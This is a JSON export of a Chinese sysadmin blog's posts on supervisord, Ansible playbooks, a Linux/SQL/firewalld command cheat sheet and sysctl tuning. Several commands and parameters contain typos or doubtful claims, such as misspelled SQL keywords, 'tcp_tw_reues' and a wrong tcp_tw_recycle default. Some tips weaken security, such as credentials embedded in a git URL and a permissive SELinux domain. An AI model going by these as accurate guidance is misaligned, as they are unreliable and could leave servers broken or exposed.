server\nautostart=true\nautorestart=true\nstartsecs=10\nstdout_logfile=/data/servers/apiapps/log/stdout.log\nstdout_logfile_maxbytes=1MB\nstdout_logfile_backups=10\nstdout_capture_maxbytes=1MB\nstderr_logfile=/data/servers/apiapps/log/stderr.log\nstderr_logfile_maxbytes=1MB\nstderr_logfile_backups=10\nstderr_capture_maxbytes=1MB\n\n$ vim /etc/supervisord.conf\n# 编辑supervisord.conf配置文件找到include项添加files内容，让它读取我们上一步的配置文件内容\n[include] \nfiles = /data/config/supervisor/*.conf\n\n$ systemctl daemon-reload\n$ systemctl enable supervisord\n$ systemctl start supervisord\n# 执行以上三条命令，如果你配置无误，你的api_server服务就会启动起来了，ps -ef | grep \"api_server\"就会在后台由supervisord管理\n```\n\n##### Supervisord常用命令\n``` bash\n$ supervisorctl start api_server\n$ supervisorctl stop api_server\n$ supervisorctl restart api_server\n# 其他详细内容可以supervisorctl -h查看\n\n# 这样子就不用我们通过/data/server/apiapps/api_server server来启动服务了\n```\n**其实在CentOS 7中，你使用系统的Systemd管理你的微服务等其他服务已经大大满足你的所有需求了，如果你技术OK的话，哈哈**","tags":["服务管理"],"categories":["服务管理"]},{"title":"Ansible自动化之批量更新代码","url":"/posts/300a3329/","content":"\n\n#### 剧本详情\n>**请根据实际情况进行修改剧本**\n```yaml\n---\n    - hosts: \"{{ hosts }}\"\n      remote_user: \"{{ user }}\"\n      gather_facts: true\n      become: yes\n      become_user: root\n      become_method: sudo\n \n      tasks:\n          - name: git pull \n            git:\n\t\t      repo: 'https://gituser:gitpasswd@github.com/git/git.git'\n\t\t\t  dest: /data/servers/webapps\n\t\t      update: yes\n\t\t      force: no\n\t\t      version: master\n```\n\n","tags":["Ansible"],"categories":["Ansible"]},{"title":"Linux常用命令速查","url":"/posts/fe75a2cb/","content":"\n# Linux常用命令速查\n\n------\n\n**注明：这只是为了作者能够在日常中快速查找使用的命令，实时更新！**\n\n##### SELinux\n``` bash \n$ yum -y install policycoreutils-python.x86_64\n# 安装Semanage工具（用来管理SELinux的工具）\n\n$ chcon -R -t httpd_sys_rw_content_t /data/webapps/\n# 把目录或文件的策略类型改成 httpd_sys_rw_content_t,一般是代码SELinux权限导致前端显示403可以执行这条命令\n\n$ restorecon <file> \n# 恢复文件SELinux上下文\n# -i：忽略不存在的文件。\n# -f：infilename 文件 infilename 中记录要处理的文件。\n# -e：directory 排除目录。\n# -R/-r：递归处理目录。\n# -n：不改变文件标签。\n# -o/outfilename：保存文件列表到 outfilename，在文件不正确情况下。\n# -v：将过程显示到屏幕上。\n# -F：强制恢复文件安全语境。\n\n$ setsebool -P httpd_can_network_connect 1\n# HTTP可以连接到网络（我之前部署WEB的时候HTTP连不数据库就敲了这条命令就可以了）\n\n$ semanage port -l | grep http_port_t\n$ semanage port -a -t http_port_t -p tcp <port>\n$ semanage port -d -t http_port_t -p tcp <port>\n# 查询SELinux的HTTP白名单规则\n# 添加SELinux的HTTP白名单规则\n# 删除SELinux的HTTP白名单规则\n\n$ chcon --reference=<src> <obj>\n# 参照源对象修改目标对象SELinux上下文\n# -f：强制执行\n# -R：递归修改\n\n$ semanage permissive -a redis_t\n# 指定该特定的程序运行Permissive,其他仍然运行Enforcing模式。\n# 当时我Redis启动不起来,报错Creating Server TCP listening socket 127.0.0.1:6379: bind: Permission denied;我就执行了这条命令就可以了\n\n未完待续···\n```\n<!-- more -->\n##### Git\n``` bash \n$ git clone <giturl> #拉取项目代码到本地服务器\n$ git pull  #更新项目代码\n$ git reflog  #查看Git日志\n$ git reset --hard <hash>  #回滚到指定版本\n$ git add .  #递归地添加当前工作目录中的所有文件到缓存区\n$ git rm <file>  #删除文件\n$ git commit -m \"Description\"  #提交已经被add进来的改动并说明Description\n$ git push origin (branchname)  #提交代码到项目分支\n$ git checkout (branchname)  #切换分支\n$ git checkout -b (branchname)  #创建并切换到新的分支\n\n未完待续···\n```\n**[Git命令官方参考文档](https://git-scm.com/docs)   [Git命令中文参考文档](https://www.cnblogs.com/Gxiaopan/p/6714539.html)**\n\n##### Database\n``` bash\n$ INSERT INFO data.table (id,name,phone) VALUES('9527','张三','11111111111');\n$ DELETE FROM data.table WHERE name='张三' and id='9527'; \n$ UPDATE data.table SET name='张三' WHERE id='9527';\n$ SELECT * FROM data.table WHERE Phone='iPhone' ORDER BY Time DESC;\n$ DROP DATABASE dataname;\n$ CREATE DATABASE dataname default charset utf8 COLLATE utf8_general_ci;  #MySQL\n$ CREATE TABLE data.tablename (\n  \"id\" int NOT NULL,\n  \"name\" vchar(10) NOT NULL,\n  );\n$ FLUSH PRIVILEGES;\n$ SOHW GRANTS FOR user;\n$ GRANT USAGE ON data.table TO 'user'@'host' IDENTIFIED BY 'passwd';\n$ GRANT ALL ON data.table TO 'user'@'host';\n\n$ CREATE INDEX index_name ON data.table USING btree(expect DESC NULLS LAST);  #PGSQL\n$ CREATE USER username WITH PASSWORD 'PASSWD';  #PGSQL\n$ CREATE DATABASE dataname;  #PGSQL\n$ GRAN ALL PRIVILEGES ON DATABASE dataname TO username;  #PGSQL\n$ ALTER SCHEMA public OWNER to username;  #PGSQL\n$ ALTER DATABASE dataname set timezone='PRC';  #PGSQL\n$ update mysql.user set password=password('passwd') where user='root'; #MySQL 5.6之前修改密码(字段是password)\n$ grep \"password\" /var/log/mysqld.log #新版MySQL5.7刚安装完查看root密码\n$ update mysql.user authentication_string=password('passwd') where user='root'; #MySQL 5.7版本修改密码(字段是authentication_string不再是password)\n$ mysqladmin -u root -p oldpasswd password 'newpasswd'; #使用mysqladmin工具修改密码\n未完待续···\n```\n\n\n##### Systemd\n``` bash\n$ systemctl daemon-reload\n$ systemctl enable service\n$ systemctl disable service\n$ systemctl start service\n$ systemctl stop service\n$ systemctl restart service\n$ systemctl status service\n\n未完待续···\n```\n\n##### Firewalld\n``` bash\n$ firewall-cmd --state  #显示当前状态\n$ firewall-cmd --zone=public --list-ports  #查看public允许进入的端口\n$ firewall-cmd --reload  #不重启立即加载\n$ firewall-cmd --list-all-zones | more  #查看区域信息情况\n$ firewall-cmd --zone=public --list-interfaces  #列出public所有网卡\n$ firewall-cmd get-zone-of-interface=ens33  #查看指定接口所属区域\n$ firewall-cmd panic-on/off  #拒绝所有包/取消拒绝状态\n$ firewall-cmd --query-panic  #查看是否拒绝\n$ firewall-cmd --permanent --add-icmp-block=echo-request  #开启禁ping\n$ firewall-cmd --permanent --remove-icmp-block=echo-request  #删除禁ping\n\n# 服务管理\n$ firewall-cmd --zone=public --add-service=http --permanent\n$ firewall-cmd --zone=public --remove-service=http --permanent\n\n# 端口管理\n$ firewall-cmd --zone=public --add-port=80/tcp --permanent\n$ firewall-cmd --zone=public --remove-port=80/tcp --permanent\n$ firewall-cmd --zone=public --add-port=80-8080/tcp --permanent\n\n# 网卡管理\n$ firewall-cmd --zone=public --add-interface=ens33 -permanent  #将ens33网卡添加到public\n$ firewall-cmd --zone=public --remove-interface=ens33 --permanent  #将ens33网卡从public删除\n$ firewall-cmd --zone=work --change-interface=ens33 --permanent  #将ens33从public改成work（会从public删除）\n\n# 端口转发\n$ firewall-cmd --zone=public --add-masquerade  #要打开端口转发则需要先敲这条命令\n$ firewall-cmd --zone=public --add-forward-port=port=22:proto=tcp:toport=2222  #转发TCP22端口到2222\n$ firewall-cmd --zone=public --add-forward-port=port=22:proto=tcp:toaddr=192.168.1.100  #转发22端口数据到另一个ip的相同端口上\n$ firewall-cmd --zone=public --add-forward-port=port=22:proto=tcp:toport=2222:toaddr=192.168.1.100  #转发22端口数据到另外一个ip的2222端口上\n\n# IP封禁(拒绝：reject 允许：accept)\n$ firewall-cmd --permanent --add-rich-rule=\"rule family='ipv4' source address='222.222.222.222' reject\"  #单个IP\n$ firewall-cmd --permanent --add-rich-rule=\"rule family='ipv4' source address='222.222.222.0/24' reject\"  #IP段\n$ firewall-cmd --permanent --add-rich-rule=\"rule family=ipv4 source address=192.168.1.2 port port=80  protocol=tcp  accept\"  #单个IP的某个端口\n\n# 通过ipset来封禁IP\n# 封禁IP\n$ firewall-cmd --permanent --zone=public --new-ipset=blacklist --type=hash:ip\n$ firewall-cmd --permanent --zone=public --ipset=blacklist --add-entry=222.222.222.222\n\n# 封禁网段\n$ firewall-cmd --permanent --zone=public --new-ipset=blacklist --type=hash:net\n$ firewall-cmd --permanent --zone=public --ipset=blacklist --add-entry=222.222.222.0/24\n\n# 倒入 ipset 规则\n$ firewall-cmd --permanent --zone=public --new-ipset-from-file=/path/blacklist.xml\n# 然后封禁 blacklist\n$ firewall-cmd --permanent --zone=public --add-rich-rule='rule source ipset=blacklist drop'\n\n# IP封禁和端口\n$ firewall-cmd --permanent --add-rich-rule=\"rule family=ipv4 source address=192.168.1.2 port port=80  protocol=tcp  accept\"\n# 只对192.168.1.2这个IP只能允许80端口访问  （拒绝访问只需把  accept 换成 reject、删除该规则把 –add-rich-rule 改成 –remove-rich-rule即可）\n\n未完待续···\n```\n","tags":["命令"],"categories":["命令"]},{"title":"Ansible自动化之批量推送文件","url":"/posts/f144c146/","content":"\n## [Ansible自动化]之批量推送文件\n\n---\n\nAnsible中文权威指南 [Ansible](http://www.ansible.com.cn/index.html)\nAnsible-Playbooks中文指南 [Ansible-Playbooks](http://www.ansible.com.cn/docs/playbooks.html)\n\n------\n\n### 剧本正文\n**请注意：（以下剧本存在一些变量，请根据实际情况使用或修改，请根据YML格式进行修改）**\n\n**剧本目录详情**\n``` dsconfig\n/etc/ansible/\n├── ansible.cfg\n├── hosts   #我这边没有使用这里存放hosts主机\n├── inventory  #这里是存放我hosts主机的目录\n│   └── aliyun  #例如：阿里云服务器\n│       ├── zabbix  #存放zabbix主机清单的目录\n│       └── webapps  #存放web的主机清单目录\n│           └── hosts  #webapps主机清单\n├── keys  #存放秘钥的目录\n│   └── ssh  #存放ssh秘钥的目录\n│       ├── centos_id_rsa.pub  #远程管理用户公钥\n│       └── centos-key.pem  #远程管理用户秘钥\n├── roles  #剧本存放的地方\n│   ├── sync  #sync剧本\n│   │   ├── files  #需要传输的文件存放目录，如果你要传输一些文件可以放到这\n│   │   │   └── music.mp3\n│   │   ├── tasks  #任务\n│   │   │   ├── main.yml  #\n│   │   │   └── sync.yml  \n│   │   └── templates  #这里存放模板的，例如我要批量推送nginx.conf就把配置好的nginx配置文件改成j2后缀的文件放在这\n│   │       └── webapps.j2\n│       └── vars\n└── sync.yml\n```\n<!-- more -->\n##### /etc/sync.yml\n``` dsconfig\n- hosts: \"{{ hosts }}\"\n  user: \"{{ user }}\"\n  become: yes\n  become_user: root\n  become_method: sudo\n  roles:\n    - sync\n```\n\n##### /etc/roles/sync/tasks/sync.yml\n``` dsconfig\n  - name: Sync webapps config\n    template: src=/etc/ansible/roles/sync/templates/webapps.j2 dest=/etc/nginx/conf.d/webapps.conf owner=root group=root mode=0644 follow=yes\n  - name: Sync webapps music\n    copy: src=/etc/ansible/roles/sync/files/music.mp3 dest=/data/servers/webapps/static/music/music.mp3 owner=nginx group=nginx mode=0644 follow=yes\n```\n\n##### /etc/ansible/inventory/aliyun/webapps/hosts\n``` dsconfig\n[frontend]\n192.168.1.100 ansible_ssh_port=22 ansible_ssh_user=centos ansible_ssh_private_key_file=/etc/ansible/keys/ssh/centos-key.pem\n```\n\n##### webapps.j2\n``` dsconfig\nserver {\n    listen       80;\n    server_name  {{ frontendip }};\n    index  index.html index.htm;\n\n    location / {\n        root /data/servers/webapps/;\n        index  index.html index.htm;\n        try_files $uri $uri/ @rewrites;\n    }\n\n    location @rewrites {\n\t#rewrite ^/(.+)$ /$1.html last;\n        rewrite ^(.+)$ /index.html last;\n    }\n\n    location /api/ {\n        proxy_pass  http://{{ backendip }}:8080/;\n        client_max_body_size 300m;\n        client_body_buffer_size 128k;\n        proxy_connect_timeout 6000;\n        proxy_read_timeout 6000;\n        proxy_send_timeout 6000;\n        #这三行 start\n        proxy_buffer_size 128k;\n        proxy_buffers   4 128k;\n        proxy_busy_buffers_size 128k;\n        #这三行 end\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-Ip $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        # proxy_set_header Accept-Encoding \"gzip\";\n    }\n}\n\n```\n\n##### 剧本详情讲解\n``` bash\n$ ansible -i /etc/ansible/inventory/aliyun/webapps/hosts frontend -a 'uptime'\n$ ansible-playbook /etc/ansible/sync.yml -i /etc/ansible/inventory/aliyun/webapps/hosts --extra-vars \"hosts=frontend user=centos frontendip=192.168.1.100 backendip=192.168.1.200\"\n\n# 首先第一步毋容置疑就是测试服务器可连接性\n# 第二步里面首先指定剧本然后指定hosts主机清单\n# 然后利用--extra-vars传送变量到剧本进行完整的执行,我们可以看到剧本里面有好几个变量\n# hosts=执行任务主机 user=执行任务的用户 在之后还有2个变量是frontendip和backendip就是nginx配置的前端监听ip和后端ip\n# 我们通过--extra-vars传送变量到配置文件,这样子我们就不需要去frontend服务器进行配置了\n```\n\n##### 执行结果\n``` dsconfig\nmusic.mp3传输目标主机的/data/servers/webapps/static/music/music.mp3下面\nwebapps.j2传输目标主机的/etc/nginx/conf.d/下并改名为webapps.conf\n然后通过传输的变量使配置文件内容变为：\nserver {\n    listen       80;\n    server_name  192.168.1.100;\n    index  index.html index.htm;\n\n    location / {\n        root /data/servers/webapps/;\n        index  index.html index.htm;\n        try_files $uri $uri/ @rewrites;\n    }\n\n    location @rewrites {\n    #rewrite ^/(.+)$ /$1.html last;\n        rewrite ^(.+)$ /index.html last;\n    }\n\n    location /api/ {\n        proxy_pass  http://192.168.1.200:8080/;\n        client_max_body_size 300m;\n        client_body_buffer_size 128k;\n        proxy_connect_timeout 6000;\n        proxy_read_timeout 6000;\n        proxy_send_timeout 6000;\n        #这三行 start\n        proxy_buffer_size 128k;\n        proxy_buffers   4 128k;\n        proxy_busy_buffers_size 128k;\n        #这三行 end\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-Ip $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        # proxy_set_header Accept-Encoding \"gzip\";\n    }\n}\n\n```\nMore Info: [Ansible](https://www.ansible.com)\n\n","tags":["Ansible"],"categories":["Ansible"]},{"title":"Systctl配置调优参考","url":"/posts/a938036c/","content":"\n# Sysctl配置调优参考\n\n\n详情请参考 [Sysctl中文参考指南](https://beytagh-stark.github.io)\n\n----------\n\n### 线上Web服务器配置参考（每天3亿PV量）\n**注明：如果你要应用该配置文件，请慎重！该配置文件未经核实有效性，仅供参考！**\n```dsconfig\nnet.ipv4.conf.lo.arp_ignore = 1\nnet.ipv4.conf.lo.arp_announce = 2\nnet.ipv4.conf.all.arp_ignore = 1\nnet.ipv4.conf.all.arp_announce = 2\nnet.ipv4.tcp_tw_reues = 1\nnet.ipv4.tcp_tw_recycle = 1\nnet.ipv4.tcp_fin_timeout = 10\n\nnet.ipv4.tcp_max_syn_backlog = 20000\nnet.core.netdev_max_backlog = 32768\nnet.core.somaxconn = 32768\n\nnet.core.wmem_default = 8388608\nnet.core.rmem_default = 8388608\nnet.core.rmem_max = 16777216\nnet.core.wmem_max = 16777216\n\nnet.ipv4.tcp_timestamps = 0\nnet.ipv4.tcp_synack_retries = 2\nnet.ipv4.tcp_syn_retries = 2\nnet.ipv4.tcp_syncookies = 1\n\nnet.ipv4.tcp_tw_recycle = 1\nnet.ipv4.tcp_tw_reues = 1\n\nnet.ipv4.tcp_mem = 94500000 915000000 927000000\nnet.ipv4.tcp_max_orphans=3276800\n\nnet.ipv4.tcp_fin_timeout = 10\nnet.ipv4.tcp_keepalive_time = 120\nnet.ipv4.ip_local_port_range = 1024 65535\nnet.ipv4.tcp_max_tw_buckets = 80000\nnet.ipv4.tcp_keepalive_time = 120\nnet.ipv4.tcp_keepalive_intvl = 15\nnet.ipv4.tcp_keepalive_probes = 5\n\nnet.ipv4.conf.lo.arp_ignore = 1\nnet.ipv4.conf.lo.arp_announce = 2\nnet.ipv4.conf.all.arp_ignore = 1\nnet.ipv4.conf.all.arp_announce = 2\n```\n<!-- more -->\n### 配置文件讲解\n\n``` dsconfig\nnet.ipv4.conf.lo.arp_ignore = 1\nnet.ipv4.conf.lo.arp_announce = 2\nnet.ipv4.conf.all.arp_ignore = 1\nnet.ipv4.conf.all.arp_announce = 2\nnet.ipv4.tcp_tw_reues = 1\nnet.ipv4.tcp_tw_recycle = 1  \n#能够更快的回收TIME-WAIT;默认值为1。\nnet.ipv4.tcp_fin_timeout = 10  \n#当套接字you本端要求关闭。它决定保持在FIN-WAIT-2状态的时间;默认值为60s。2.2内核的通常值是180s;这个数值如果设置太大会出现内存溢出的风险。\n\nnet.ipv4.tcp_max_syn_backlog = 20000  \n#记录的那些尚未收到客户端确认信息的链接请求的最大值。 默认值为4096 如果设置这个值大于4096最好同时调整include/net/tcp.h中的TCP_SYNQ_HSIZE,保证TCP_SYNQ_HSIZE*16 <=tcp_max_syn_backlo然后重新编译内核。\nnet.core.netdev_max_backlog = 32768\n#指定在接口接收数据包的速率比内核处理这些包的速率快时,允许送到队列的数据包的最大数。\nnet.core.somaxconn = 32768\n#限制套接字侦听积压,已知在使用着的somaxconn。默认值为128。如果调整套接字请参阅tcp_max_syn_backlog。\n\nnet.core.wmem_default = 8388608\n#默认的发送窗口大小\nnet.core.rmem_default = 8388608\n#接收窗口的默认大小\nnet.core.rmem_max = 16777216\n#接收窗口的最大大小\nnet.core.wmem_max = 16777216\n#发送窗口的最大大小\n\nnet.ipv4.tcp_timestamps = 0\n#时间戳可以避免序列号的卷绕。一个1Gbps的链路肯定会遇到以前用过的序列号,时间戳能够让内核接受这种“异常”的数据包。\nnet.ipv4.tcp_synack_retries = 2\n#为了打开对端的链接,内核需要发送一个SYN并附带一个回应前面一个SYN的ACK。也就是所谓三次握手中的第二次握手。这个设置决定了内核放弃链接前发送SYN+ACK包的数量。\nnet.ipv4.tcp_syn_retries = 2\n#在内核放弃建立连接前发送SYN包的数量。\nnet.ipv4.tcp_syncookies = 1\n#默认值是0,只有在内核编译时选择了CONFIG_SYNCOOKIES时才会发生作用。当出现syn等候队列出现溢出时对方发送syncookies。目的是为了防止syn flood攻击。\n\n\nnet.ipv4.tcp_tw_recycle = 1\n#能够更快的回收TIME-WAIT。默认值为1。\nnet.ipv4.tcp_tw_reues = 1\n\nnet.ipv4.tcp_mem = 94500000 915000000 927000000\n#此选项里有三个变量:low,pressure,high。\n\n#Low:当TCP使用了低于该值的内存页面数时,TCP不会考虑释放内存。(理想情况下,这个值应与指定给tcp_wmem的第2个值相匹配-这第2个值表明,最大页面大小乘以最大并发请求数除以页大小(131072*300/4096)。)\n\n#Pressure:当TCP使用了超过该值的内存页面数量时,TCP试图稳定其内存使用,进入pressure模式,当内存消耗低于low值时则退出pressure状态。(理想情况下这个值应该是TCP可以使用的总缓冲区大小的最大值(204800*300/4096))\n\n#High:允许所有tcp sockets用于排队缓冲数据报的页面量。(如果超过这个值,TCP链接将被拒绝,这就是为什么不要令其过于保守(512000*300/4096)的原因了,在这种情况下,提供的价值很大,它能处理很多连接,是所预期的2.5倍;或者使现有连接能够传输2.5倍的数据。)\nnet.ipv4.tcp_max_orphans = 3276800\n#系统中最多有多少个TCP套接字不被关联到任何一个用户文件句柄上。如果超过这个数字,孤儿链接将即将被复位并打印出警告信息。这个限制仅仅是为了防止简单的DOS攻击。\n\nnet.ipv4.tcp_fin_timeout = 10\n#当套接字由本端要求关闭,它决定保持在FIN-WAIT-2状态的时间。默认值为60秒。2.2内核的通常值是180秒。这个数值如果设置太大会出现内存溢出的风险。\nnet.ipv4.tcp_keepalive_time = 120\n#当启用keepalive的时候,TCP发送keepalive消息的频度,默认为2小时。\nnet.ipv4.ip_local_port_range = 1024 65535\n#用于向外连接的宽口范围。默认情况为1024到61000\n\nnet.ipv4.tcp_max_tw_buckets = 80000\n#系统同时保持timewait套接字的最大数。默认值为180000。\nnet.ipv4.tcp_keepalive_time = 120\n#当启用keepalive的时候,TCP发送keepalive消息的频度,默认为2小时。\nnet.ipv4.tcp_keepalive_intvl = 15\n#当检测没有确认时,重新发送检测的频度,默认是75秒。\nnet.ipv4.tcp_keepalive_probes = 5\n#在认定链接失效之前,发送多少个TCP的keepalive的检测包,默认值为9.这个值乘以tcp_keepalive_intvl之后决定了一个链接发送了keepalive之后可以有多少时间没有回应。\nnet.ipv4.conf.lo.arp_ignore = 1\nnet.ipv4.conf.lo.arp_announce = 2\nnet.ipv4.conf.all.arp_ignore = 1\nnet.ipv4.conf.all.arp_announce = 2\n```\n\n## sysctl常用命令使用\n加载系统参数    `sysctl -p`\n显示所有系统参数    `sysctl -a`\n临时改变某个指定参数的值    `sysctl -w`  例如：`sysctl -w net.ipv4.ip_forward=1`\n\n","tags":["Linux内核"],"categories":["Linux内核"]},{"title":"Sysctl中文参考指南","url":"/posts/425561b7/","content":"\n# Sysctl中文参考指南\n\n\n\n\n----------\n\n### 仅供参考\n**注明：如果你要应用该配置文件，请慎重！**\n<!-- more -->\n```dsconfig\ndev.scsi.logging_level = 0\n#参数设置作业类跟踪多少日志数据。\n\ndev.raid.speed_limit_max = 200000\n#RAID1,RAID5,RAID6需要初始化同步RAID的同步最大速度限制。\n\ndev.raid.speed_limit_min = 1000\n#RAID1,RAID5,RAID6需要初始化同步RAID的同步最小速度限制。\n\ndev.cdrom.check_media = 0\ndev.cdrom.info = CD-ROM information, Id: cdrom.c 3.20 2003/12/17\ndev.cdrom.info = drive name: hda\ndev.cdrom.info = drive speed: 24\ndev.cdrom.info = drive # of slots: 1\ndev.cdrom.info = Can close tray: 1\ndev.cdrom.info = Can open tray: 1\ndev.cdrom.info = Can lock tray: 1\ndev.cdrom.info = Can change speed: 1\ndev.cdrom.info = Can select disk: 0\ndev.cdrom.info = Can read multisession: 1\ndev.cdrom.info = Can read MCN: 1\ndev.cdrom.info = Reports media changed: 1\ndev.cdrom.info = Can play audio: 1\ndev.cdrom.info = Can write CD-R: 0\ndev.cdrom.info = Can write CD-RW: 0\ndev.cdrom.info = Can read DVD: 1\ndev.cdrom.info = Can write DVD-R: 0\ndev.cdrom.info = Can write DVD-RAM: 0\ndev.cdrom.info = Can read MRW: 1\ndev.cdrom.info = Can write MRW: 1\ndev.cdrom.info = Can write RAM: 1\n#以上为相应的设备名称。\n\ndev.rtc.max-user-freq = 64\n#设置用户时钟的最大频率。建议将其添加到系统启动脚本。\n\ndebug.exception-trace = 1\n#这个文件可以开启和关闭segfault 默认开启\n\nnet.unix.max_dgram_qlen = 10\n#max_dgram-qlen限制了多少数据可以按队列在unix域套接字(SOCK_DGRAM)接收缓冲区,如果发件人尝试传送更多的数据或返回错误。默认值为10\n\nnet.token-ring.rif_timeout = 600000\n#默认请求超时10分钟配置完成。\n\nnet.ipv4.conf.eth0. disable_policy = 0  net.ipv4.conf.lo.disable_policy = 0\nnet.ipv4.conf.default.disable_policy = 0 net.ipv4.conf.all.disable_policy = 0\n#禁用IPSEC策略(spd)在这个接口。\n\nnet.ipv4.conf.eth0.arp_ignore = 0 net.ipv4.conf.lo.arp_ignore = 0\nnet.ipv4.conf.default.arp_ignore = 0 net.ipv4.conf.all.arp_ignore = 0\n#确定不同的方式发送的回应收到ARP协议要求,解决本地的目标IP地址:\n#0-(默认)代表任何地方的目标IP地址,配置任何接口。\n#1-答复只有目标IP地址是本地地址上配置传入接口。\n#2-回复只有当目标IP地址是本地地址上配置传入接口的两个与发件人的IP地址是来自同一个子网这个界面。\n#3-不要回复对于本地地址配置host范围,为全球唯一的决议和链接地址的答复。\n#4-7-保留。\n#8-不回复所有本地地址。\n\nnet.ipv4.conf.eth0.tag = 0 net.ipv4.conf.lo.tag = 0\nnet.ipv4.conf.default.tag = 0 net.ipv4.conf.all.tag = 0\n#允许写一些,它可以被用来作为必须的,默认值为0\n\nnet.ipv4.conf.eth0.medium_id = 0 net.ipv4.conf.lo.medium_id = 0\nnet.ipv4.conf.default.medium_id = 0 net.ipv4.conf.all.medium_id = 0\n#整数值用来区分不同的设备这种方法我们十分喜爱。两个设备可有不同的ID值的广播数据包是,只收到其中的一个。默认值是0,表示该设备是唯一的接口,值为-1表示不知道。\n#目前,它是由你用来改变proxy_arp行为。Proxy_arp功能是用来数据包在两个不同的设备间互相转发后连接到不同的媒体上。\n\nnet.ipv4.conf.eth0.rp_filter = 1 net.ipv4.conf.lo.rp_filter = 1\nnet.ipv4.conf.default.rp_filter = 1 net.ipv4.conf.all.rp_filter = 0\n#1 通过反向路由回溯进行源地址验证(在RFC1812中定义)。对于单一主机和stub网络路由器推荐使用该选项。\n#0 不通过反向路由回溯进行源地址验证。缺省值为0\n\nnet.ipv4.conf.lo.force_igmp_version = 0 net.ipv4.conf.default.force_igmp_version = 0\nnet.ipv4.conf.all.force_igmp_version = 0 net.ipv4.conf.eth0.force_igmp_version = 0\n#IGMP组播协议版本\n\nnet.ipv4.conf.lo.accept_redirects = 1 net.ipv4.conf.eth0.accept_redirects = 1\nnet.ipv4.conf.default.accept_redirects = 1 net.ipv4.conf.all.accept_redirects = 1\n#如果主机所在的网段中有两个路由器,你将其中一个设置成了缺省网关,但该网关在收到你的ip包时发现该ip包必须经过另外一个路由器,这是这个路由器就会给你发出一个所谓“重定向”的icmp包,告诉将ip包转发到另外一个路由器,参数值为布尔值。1表示接受这类重定向icmp信息。0表示忽略。在充当路由器的linux主机上缺省值为0.在一般的linux主机缺省值为1.建议将其改为0以消除安全隐患。\n\nnet.ipv4.conf.default.disable_xfrm = 0 net.ipv4.conf.all.disable_xfrm = 0\nnet.ipv4.conf.eth0.disable_xfrm = 0 net.ipv4.conf.lo.disable_xfrm = 0\n#无论什么策略,禁用IPsec加密这个接口上。\n\nnet.ipv4.conf.default.arp_announce = 0 net.ipv4.conf.all.arp_announce = 0\nnet.ipv4.conf.eth0.arp_announce = 0 net.ipv4.conf.lo.arp_announce = 0\n#定义不同程序的限制,宣布本地IP地址和IP数据包中的ARP协议要求发出的接口:\n#0-(默认)使用任何本地地址,上配置任何接口。\n#1- 尽量避免本地地址不属于目标的子网掩码这个接口的,这种模式是有用的当地到达目标主机需要通过这个接口的源IP地址的ARP协议要求的一部分,其逻辑网络上配置接受接口,当我们出现需求,我们将检查所有的子网,包括我们的目标将维持原地址,如果没有这样的子网,我们根据地址规则选择2.\n#2-始终使用当地最好的解决这一目标。在这种模式下,我们忽视了源地址的IP数据包,并尝试选择本地地址的,我们希望会谈的目标主机。这些地方是选中的地址寻找小学的所有IP地址的子网的接口,其中包括即将离任的目标IP地址。如果没有合适的本地地址是发现我们选择第一个本地地址,我们对即将离任的接口或其他所有的接口,希望我们将得到答复我们的要求,有时甚至不管源IP地址,我们宣布\n\nnet.ipv4.conf.default.arp_filter = 0 net.ipv4.conf.all.arp_filter = 0\nnet.ipv4.conf.eth0.arp_filter = 0 net.ipv4.conf.lo.arp_filter = 0\n#0-(默认)内核能响应ARP协议请求地址从其他接口,这看上去可能是错的但是它通常是有意义的,,因为它增加了成功的机会沟通,IP地址所拥有的完整的主机在linux上,而不是由特定的接口。只为更负载的设置相似的负载均衡,这样的行为会的导致问题。\n#1-你可以拥有多个网络接口在同一个子网上,并有ARPs为每个接口的基础上回答与否路线的核心将一包的IP从ARP’d说接口(因此,您必须使用来源路由这一工作)。换句话说,它可以控制的卡(通常是1)将响应一个ARP请求。\n\nnet.ipv4.conf.default.proxy_arp = 0 net.ipv4.conf.lo.proxy_arp = 0 \nnet.ipv4.conf.all.proxy_arp = 0  net.ipv4.conf.eth0.proxy_arp = 0\n#设置是否对网络上的arp包进行中继。参数值为布尔值,1表示中继,0表示忽略。缺省值为0。该参数通常只对充当路由器的linux主机有用。\n\nnet.ipv4.conf.default.forwarding = 0 net.ipv4.conf.eth0.forwarding = 0\nnet.ipv4.conf.all.forwarding = 0 net.ipv4.conf.lo.forwarding = 0\n#在该接口打开转发功能。\n\nnet.ipv4.conf.all.log_martians = 0 net.ipv4.conf.eth0.log_martians = 0\nnet.ipv4.conf.lo.log_martians = 0 net.ipv4.conf.default.log_martians = 0\n#记录带有不允许的地址的数据报到内核日志中。\n\nnet.ipv4.conf.all.bootp_relay = 0 net.ipv4.conf.eth0.bootp_relay = 0\nnet.ipv4.conf.lo.bootp_relay = 0 net.ipv4.conf.default.bootp_relay = 0\n#接收源地址0.b.c.d,目的地址不是本机的数据报。用来支持BOOTP转发服务进程,该进程将捕获并转发该包。默认是false,目前还没有实现。\n\nnet.ipv4.conf.all.accept_source_route = 0 net.ipv4.conf.default.accept_source_route = 0\nnet.ipv4.conf.eth0.accept_source_route = 0 net.ipv4.conf.lo.accept_source_route = 0 \n#接收带有SRR选项的数据报。对于主机来说默认是false,对于用作路由器时默认值为true。\n\nnet.ipv4.conf.all.send_redirects = 1 net.ipv4.conf.eth0.send_redirects = 1\nnet.ipv4.conf.lo.send_redirects = 1 net.ipv4.conf.default.send_redirects = 1\n#如果是router,发送重定向消息,默认是true。\n\nnet.ipv4.conf.all.shared_media = 1 net.ipv4.conf.eth0.shared_media = 1\nnet.ipv4.conf.lo.shared_media = 1 net.ipv4.conf.default.shared_media = 1\n#发送(路由器)或接收(主机)RFC1620共享媒体重定向,覆盖ip_secure_redirects的值。默认为true。\n\nnet.ipv4.conf.eth0.secure_redirects = 1 net.ipv4.conf.default.secure_redirects = 1\nnet.ipv4.conf.all.secure_redirects = 1  net.ipv4.conf.lo.secure_redirects = 1\n#其实所谓的“安全重定向”就是只接受来自网关的“重定向”icmp包。该参数就是用来设置“安全重定向”功能的。参数值为布尔值,1表示启用。0表示禁止,缺省值为启用\n\nnet.ipv4.conf.all.mc_forwarding = 0 net.ipv4.conf.eth0.mc_forwarding = 0\nnet.ipv4.conf.lo.mc_forwarding = 0 net.ipv4.conf.default.mc_forwarding = 